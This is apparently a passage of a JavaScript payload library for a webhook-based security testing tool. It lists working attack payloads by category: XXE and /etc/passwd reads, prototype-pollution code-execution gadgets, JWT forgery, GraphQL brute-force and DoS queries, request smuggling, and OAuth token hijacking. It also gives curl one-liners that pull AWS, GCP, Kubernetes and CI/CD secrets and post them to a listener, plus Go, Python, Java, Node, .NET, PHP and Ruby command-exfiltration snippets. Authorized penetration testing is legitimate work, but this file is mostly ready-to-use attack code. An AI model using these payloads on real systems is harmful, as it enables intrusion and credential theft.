          code: `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "${webhookUrl}/svg"> ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>`, 
          desc: 'Payload embedded inside SVG image uploads; triggers XXE callback when image is processed or rendered by server.',
          priority: 'HIGH', 
          era: 'File Upload',
          tech: 'SVG / Image XML'
        },
        { 
          title: 'Microsoft Office XLSX XML Injection', 
          code: `<!DOCTYPE root [<!ENTITY % remote SYSTEM "${webhookUrl}/xlsx">%remote;]>`, 
          desc: 'Injected into xl/workbook.xml or [Content_Types].xml within zipped .xlsx spreadsheet to test server parser.',
          priority: 'HIGH', 
          era: 'OOXML / Office',
          tech: 'Office XML'
        },
        { 
          title: 'Blind XXE HTTP Callback', 
          code: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "${webhookUrl}/xxe">%remote;]><root/>`, 
          desc: 'Triggers immediate HTTP pingback to webhook listener to confirm external entity parsing.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'XML Parser'
        },
        { 
          title: 'Classic Local File Inclusion Entity', 
          code: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 
          desc: 'Direct entity expansion for reflected XXE vulnerability endpoints.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'XML Parser'
        }
      ]
    },
    {
      category: 'PROT',
      title: 'Prototype Pollution (Client & Server)',
      items: [
        { 
          title: 'Client-Side Query String Prototype Pollution Probe', 
          code: `?__proto__[polluted]=true&constructor[prototype][polluted]=true`, 
          desc: 'Checks if Object.prototype is polluted globally; verify in browser console with Object.prototype.polluted.',
          priority: 'HIGH', 
          era: 'Client-Side JS',
          tech: 'JavaScript'
        },
        { 
          title: 'JSON Body Prototype Pollution Payload', 
          code: `{"__proto__": {"admin": true, "role": "superuser"}}`, 
          desc: 'Injected into JSON request bodies parsed by unpatched recursive merge or clone libraries (Lodash, deepmerge).',
          priority: 'HIGH', 
          era: 'Server-Side JS',
          tech: 'Node.js / JSON'
        },
        { 
          title: 'Node.js Child Process fork NODE_OPTIONS RCE', 
          code: `{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}`, 
          desc: 'Pollutes child_process.fork or exec options in Node.js to trigger arbitrary code execution upon child spawn.',
          priority: 'HIGH', 
          era: 'RCE Gadget',
          tech: 'Node.js'
        },
        { 
          title: 'Express / Body-Parser Array Parameter Pollution', 
          code: `?__proto__.toString=123`, 
          desc: 'Pollutes toString prototype method to cause application crash or unhandled TypeError DoS in Express.',
          priority: 'HIGH', 
          era: 'Denial of Service',
          tech: 'Express.js'
        },
        { 
          title: 'Sanitize-HTML Bypass via Prototype Pollution', 
          code: `{"__proto__": {"allowedTags": ["script", "iframe", "img"], "allowedAttributes": {"*": ["onload", "onerror", "src"]}}}`, 
          desc: 'Pollutes sanitizer configuration object allowing arbitrary script elements through HTML filters.',
          priority: 'HIGH', 
          era: 'Sanitizer Bypass',
          tech: 'HTML Sanitizers'
        },
        { 
          title: 'Lodash Template Prototype Pollution RCE', 
          code: `{"__proto__": {"sourceURL": "\\nreturn process.mainModule.require('child_process').execSync('curl ${webhookUrl}/?pp=1')//"}}`, 
          desc: 'Exploits lodash.template sourceURL property injection to execute shell commands during template rendering.',
          priority: 'HIGH', 
          era: 'RCE Gadget',
          tech: 'Lodash / Node.js'
        }
      ]
    },
    {
      category: 'JWT',
      title: 'JSON Web Token (JWT) Attacks',
      items: [
        { 
          title: 'Algorithm None Signature Bypass', 
          code: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlzcyI6ImF1dGgtc2VydmljZSIsImlhdCI6MTYwMDAwMDAwMCwiYWRtaW4iOnRydWV9.`, 
          desc: 'Sets header alg to none and strips the signature portion; bypasses unpatched token verification middleware.',
          priority: 'HIGH', 
          era: 'Signature Bypass',
          tech: 'JWT Standard'
        },
        { 
          title: 'RS256 to HS256 Public Key Confusion', 
          code: `jwt.sign(payload, publicKeyPem, { algorithm: 'HS256' })`, 
          desc: 'Signs token with server public RSA key using HMAC-SHA256, exploiting servers that blindly accept algorithm from header.',
          priority: 'HIGH', 
          era: 'Key Confusion',
          tech: 'JWT HMAC'
        },
        { 
          title: 'JWK (JSON Web Key) Header Injection', 
          code: `{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","use":"sig","kid":"attacker-key","n":"..."}}`, 
          desc: 'Embeds attacker public key directly in token jwk header; succeeds when server verifies signature against embedded key.',
          priority: 'HIGH', 
          era: 'Key Injection',
          tech: 'JWT JWK'
        },
        { 
          title: 'JKU (JWK Set URL) Webhook Header Redirection', 
          code: `{"alg":"RS256","typ":"JWT","jku":"${webhookUrl}/.well-known/jwks.json","kid":"my-key"}`, 
          desc: 'Points jku header to your webhook receiver hosting a forged jwks.json keyset for signature verification.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'JWT JKU'
        },
        { 
          title: 'KID Path Traversal to /dev/null', 
          code: `{"alg":"HS256","typ":"JWT","kid":"../../../../../../../dev/null"}`, 
          desc: 'Traverses key ID to /dev/null; HMAC signature is verified against an empty string ("").',
          priority: 'HIGH', 
          era: 'Path Traversal',
          tech: 'JWT KID'
        },
        { 
          title: 'KID SQL Injection Bypass', 
          code: `{"alg":"HS256","typ":"JWT","kid":"key1' UNION SELECT 'mysecret'-- -"}`, 
          desc: 'Injects into database key retrieval query so secret returns attacker-known literal string.',
          priority: 'HIGH', 
          era: 'SQL Injection',
          tech: 'JWT / SQL'
        }
      ]
    },
    {
      category: 'GQL',
      title: 'GraphQL Security Testing',
      items: [
        { 
          title: 'Full Schema Introspection Query', 
          code: `{"query":"query{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}`, 
          desc: 'Dumps entire GraphQL schema including hidden mutations, internal types, and administrative queries.',
          priority: 'HIGH', 
          era: 'Information Disclosure',
          tech: 'GraphQL API'
        },
        { 
          title: 'Field Suggestion Keyword Enumeration', 
          code: `{"query":"query{admin_users}"}`, 
          desc: 'Triggers Did you mean...? suggestions to map internal fields even when introspection is disabled.',
          priority: 'MEDIUM', 
          era: 'Schema Mapping',
          tech: 'GraphQL API'
        },
        { 
          title: 'Alias Batching Query (Brute-Force / Rate Limit Bypass)', 
          code: `{"query":"query{b1:login(u:\\"admin\\",p:\\"123\\"){token} b2:login(u:\\"admin\\",p:\\"admin\\"){token} b3:login(u:\\"admin\\",p:\\"root\\"){token}}"}`, 
          desc: 'Executes dozens of sub-queries within a single HTTP request to bypass API rate limiting.',
          priority: 'HIGH', 
          era: 'Rate Limit Bypass',
          tech: 'GraphQL Aliases'
        },
        { 
          title: 'Circular Relationship Query Depth Bomb (DoS)', 
          code: `{"query":"query{thread{comments{thread{comments{thread{comments{id}}}}}}}}"}`, 
          desc: 'Nests recursive relational fields to cause high memory allocation and thread starvation on GraphQL backend.',
          priority: 'HIGH', 
          era: 'Denial of Service',
          tech: 'GraphQL DoS'
        },
        { 
          title: 'GraphQL SSRF Callback inside Resolver', 
          code: `{"query":"mutation{createWebhook(targetUrl:\\"${webhookUrl}?src=graphql\\"){id status}}"}`, 
          desc: 'Injects webhook listener URL into mutation parameters to test resolver outbound networking.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'GraphQL Mutation'
        }
      ]
    },
    {
      category: 'CORS',
      title: 'CORS & Web Cache Security',
      items: [
        { 
          title: 'Arbitrary Origin Reflection with Credentials', 
          code: `curl -H "Origin: https://evil.com" -I "${webhookUrl}"`, 
          desc: 'Checks if backend blindly reflects incoming Origin header along with Access-Control-Allow-Credentials: true.',
          priority: 'HIGH', 
          era: 'CORS Misconfig',
          tech: 'HTTP Headers'
        },
        { 
          title: 'Null Origin Header Reflection', 
          code: `curl -H "Origin: null" -I "${webhookUrl}"`, 
          desc: 'Tests if Origin: null is whitelisted (common sandbox misconfiguration in iframe/sandboxed origins).',
          priority: 'HIGH', 
          era: 'CORS Misconfig',
          tech: 'HTTP Headers'
        },
        { 
          title: 'Subdomain Prefix / Suffix Regex Bypass', 
          code: `curl -H "Origin: https://target.com.attacker.com" -I "${webhookUrl}"`, 
          desc: 'Exploits poorly written regex (e.g. target.com without escaped dot or end anchor) in origin validation.',
          priority: 'HIGH', 
          era: 'Filter Bypass',
          tech: 'Regex Bypass'
        },
        { 
          title: 'Web Cache Poisoning via Unkeyed Host Header', 
          code: `GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: ${webhookHost}\nX-Host: ${webhookHost}`, 
          desc: 'Forces cache engine to store pages loading static assets or scripts from your webhook host.',
          priority: 'HIGH', 
          era: 'Cache Poisoning',
          tech: 'Cache / CDN'
        },
        { 
          title: 'Web Cache Deception Static File Extension Probe', 
          code: `/api/v1/user/settings.css`, 
          desc: 'Requests sensitive dynamic JSON endpoints with static file extensions (.css, .js, .png) to force CDN caching.',
          priority: 'HIGH', 
          era: 'Cache Deception',
          tech: 'CDN / Reverse Proxy'
        },
        { 
          title: 'HTTP Request Smuggling CL.TE Probe', 
          code: `POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG`, 
          desc: 'Basic probe detecting discrepancy where frontend uses Content-Length and backend uses Transfer-Encoding.',
          priority: 'HIGH', 
          era: 'Smuggling Probe',
          tech: 'HTTP/1.1'
        }
      ]
    },
    {
      category: 'REDIRECT',
      title: 'Open Redirect & OAuth Attacks',
      items: [
        { 
          title: 'Scheme-less Protocol-Relative Redirect', 
          code: `//${webhookHost}`, 
          desc: 'Uses double slash to trigger redirection matching current protocol without explicit http:// scheme.',
          priority: 'HIGH', 
          era: 'Redirect Bypass',
          tech: 'URL Parser'
        },
        { 
          title: 'Backslash / Slash Combination Evasion', 
          code: `/\\${webhookHost}`, 
          desc: 'Bypasses regex checks searching for leading // by utilizing backward slash character.',
          priority: 'HIGH', 
          era: 'Redirect Bypass',
          tech: 'URL Parser'
        },
        { 
          title: 'HTTP Parameter Pollution (HPP) Redirect', 
          code: `?redirect=target.com&redirect=${webhookUrl}`, 
          desc: 'Exploits servers that take the second occurrence of duplicate query parameters.',
          priority: 'HIGH', 
          era: 'Parameter Pollution',
          tech: 'HTTP Query'
        },
        { 
          title: 'OAuth 2.0 Redirect URI Parameter Hijacking', 
          code: `https://auth.target.com/oauth/authorize?client_id=123&redirect_uri=${webhookUrl}&response_type=token`, 
          desc: 'Points OAuth redirect_uri to your webhook listener to capture user access tokens or auth codes.',
          priority: 'HIGH', 
          era: 'OAuth Stealer',
          tech: 'OAuth 2.0'
        },
        { 
          title: 'PostMessage Token Exfiltration Handler', 
          code: `<script>window.addEventListener('message',function(e){fetch('${webhookUrl}/?pm='+encodeURIComponent(JSON.stringify(e.data)))});</script>`, 
          desc: 'Captures and exfiltrates unvalidated cross-window postMessage events sent from parent or opener windows.',
          priority: 'HIGH', 
          era: 'Client Exfiltration',
          tech: 'Browser JS'
        }
      ]
    },
    {
      category: 'CLOUD',
      title: 'Cloud & CI/CD Token Exfiltration',
      items: [
        { 
          title: 'AWS EC2 IAM Role Credential Extraction', 
          code: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) | curl -X POST -d @- ${webhookUrl}`, 
          desc: 'Extracts temporary AWS AccessKeyId, SecretAccessKey, and Token and posts to webhook listener.',
          priority: 'HIGH', 
          era: 'Cloud Credential',
          tech: 'AWS EC2 / IAM'
        },
        { 
          title: 'GitHub Actions Runner Secret Dump', 
          code: `curl -X POST -H "Content-Type: application/json" -d '{"repo":"'$GITHUB_REPOSITORY'","token":"'$ACTIONS_RUNTIME_TOKEN'"}' ${webhookUrl}`, 
          desc: 'Exfiltrates GitHub Actions workflow runtime token and repository context from runner.',
          priority: 'HIGH', 
          era: 'CI/CD Exfiltration',
          tech: 'GitHub Actions'
        },
        { 
          title: 'Kubernetes Pod ServiceAccount Exfiltration', 
          code: `curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" https://kubernetes.default.svc/api/v1/namespaces/default/pods | curl -X POST -d @- ${webhookUrl}`, 
          desc: 'Queries Kubernetes API using default pod service account token and streams response to webhook.',
          priority: 'HIGH', 
          era: 'Cloud Credential',
          tech: 'Kubernetes Cluster'
        },
        { 
          title: 'GitLab CI Secret Environment Variables', 
          code: `env | grep -E "CI_|GITLAB|TOKEN|KEY|PASS" | curl -X POST --data-binary @- ${webhookUrl}`, 
          desc: 'Filters and posts sensitive GitLab CI environment credentials to webhook receiver.',
          priority: 'HIGH', 
          era: 'CI/CD Exfiltration',
          tech: 'GitLab CI'
        },
        { 
          title: 'GCP Compute Access Token Exfiltration', 
          code: `curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | curl -X POST -d @- ${webhookUrl}`, 
          desc: 'Pulls active OAuth2 access token for default GCP service account and posts to listener.',
          priority: 'HIGH', 
          era: 'Cloud Credential',
          tech: 'Google Cloud (GCP)'
        },
        { 
          title: 'Azure App Service Secret Environment Dump', 
          code: `curl -s "${webhookUrl}/?azure=" -d "$APPSETTING_SECRET_KEY"`, 
          desc: 'Exfiltrates Azure App Service deployment settings and environment connection strings.',
          priority: 'HIGH', 
          era: 'Cloud Credential',
          tech: 'Microsoft Azure'
        }
      ]
    },
    {
      category: 'LANG',
      title: 'Code Exfiltration Callbacks',
      items: [
        { 
          title: 'Go (Golang) Silent HTTP Out-of-Band', 
          code: `package main; import ("net/http"; "os/exec"); func main() { out, _ := exec.Command("id").Output(); http.Get("${webhookUrl}/?go=" + string(out)) }`, 
          desc: 'Runs system command silently and exfiltrates stdout over HTTP GET.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Go / Golang'
        },
        { 
          title: 'Python 3 Raw Socket Connection', 
          code: `import socket; s = socket.create_connection(('${webhookHost}', 80)); s.sendall(b'GET /api/r/${id}?sock=1 HTTP/1.1\\r\\nHost: ${webhookHost}\\r\\nConnection: close\\r\\n\\r\\n')`, 
          desc: 'Establishes direct TCP socket connection; bypasses OS proxy settings and urllib restrictions.',
          priority: 'HIGH', 
          era: 'Low-Level Socket',
          tech: 'Python 3'
        },
        { 
          title: 'Python 3 Urllib Subprocess Exfiltration', 
          code: `import urllib.request, subprocess; r = subprocess.check_output('id', shell=True).decode(); urllib.request.urlopen(f'${webhookUrl}/?py=' + r.strip())`, 
          desc: 'Standard Python 3 one-liner capturing command output and piping to webhook.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Python 3'
        },
        { 
          title: 'Java Runtime Out-of-Band Callback', 
          code: `Runtime.getRuntime().exec(new String[]{"sh", "-c", "curl ${webhookUrl}/?java=" + System.getProperty("user.name")});`, 
          desc: 'Invokes native shell process in Java to exfiltrate current username.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Java / JVM'
        },
        { 
          title: 'Java ProcessBuilder Base64 Pipeline', 
          code: `new ProcessBuilder("sh", "-c", "echo $(id) | base64 | xargs -I {} curl ${webhookUrl}/?id={}").start();`, 
          desc: 'Spawns detached background process pipeline encoding identity before transmission.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Java / JVM'
        },
        { 
          title: 'Node.js Child Process Async Callback', 
          code: `require('child_process').exec('id', (e, out) => { require('https').get('${webhookUrl}/?node=' + encodeURIComponent(out)) });`, 
          desc: 'Asynchronous child process execution sending URI-encoded stdout over HTTPS.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Node.js'
        },
        { 
          title: '.NET Core C# Process Exfiltration', 
          code: `using var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("whoami") { RedirectStandardOutput = true }); new System.Net.Http.HttpClient().GetStringAsync("${webhookUrl}/?dotnet=" + p.StandardOutput.ReadToEnd());`, 
          desc: 'Runs whoami via System.Diagnostics.Process and exfiltrates output via HttpClient.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: '.NET Core / C#'
        },
        { 
          title: 'PHP cURL Environment Exfiltration', 
          code: `<?php $ch = curl_init('${webhookUrl}/?php=' . urlencode(php_uname())); curl_exec($ch); ?>`, 
          desc: 'Captures PHP system information and transmits via cURL session.',
          priority: 'MEDIUM', 
          era: 'Standard Callback',
          tech: 'PHP'
        },
        { 
          title: 'Ruby URI Open Subshell', 
          code: `require 'open-uri'; URI.open("${webhookUrl}/?rb=" + \`whoami\`.strip)`, 
          desc: 'Executes whoami in subshell and requests webhook URL with result.',
          priority: 'MEDIUM', 
          era: 'Standard Callback',
          tech: 'Ruby'
        }
      ]
    },
    {
      category: 'ANDROID',
      title: 'Android & Mobile Security',
      items: [
        { 
          title: 'Android WebView JavaScriptInterface Bridge Abuse', 
          code: `<script>if(window.Android){const res=window.Android.getUserToken();fetch('${webhookUrl}/?token='+encodeURIComponent(res));}</script>`, 
          desc: 'Extracts sensitive data from Java objects exported to WebViews via @JavascriptInterface.',
          priority: 'HIGH', 
          era: 'Bridge Exploitation',
          tech: 'Android WebView'
        },
        { 
          title: 'Android Intent URL Scheme Callback Redirection', 
          code: `intent://auth#Intent;scheme=myapp;package=com.target.app;S.redirect_url=${webhookUrl};end;`, 
          desc: 'Exploits unprotected exported activity handling intent:// schemes to redirect token to webhook.',
          priority: 'HIGH', 
          era: 'Intent Scheme',
          tech: 'Android OS'
        },
        { 
          title: 'Android ADB Deep Link Verification', 
          code: `adb shell am start -W -a android.intent.action.VIEW -d "myapp://credentials?token=test_key&callback=${webhookUrl}"`, 
          desc: 'Tests deep link routing and parameter validation directly from ADB command line.',
          priority: 'HIGH', 
          era: 'ADB Tooling',
          tech: 'Android ADB'
        },
        { 
          title: 'Android WebView Local File Access Overriding (LFA)', 
          code: 'webView.getSettings().setAllowFileAccess(true); webView.getSettings().setAllowUniversalAccessFromFileURLs(true);', 
          desc: 'Critical WebView misconfiguration allowing file:// schemes to access app private data and make cross-origin requests.',
          priority: 'MEDIUM', 
          era: 'Audit / Review',
          tech: 'Android WebView Settings'
        },
        { 
          title: 'Android Cleartext Traffic Insecure Permissive Policy', 
          code: '<application android:usesCleartextTraffic="true"> ... </application>', 
          desc: 'Audit flag in AndroidManifest.xml permitting unencrypted HTTP traffic.',
          priority: 'LOW', 
          era: 'Audit / Review',
          tech: 'Android Manifest XML'
        }
      ]
    }
  ];
}
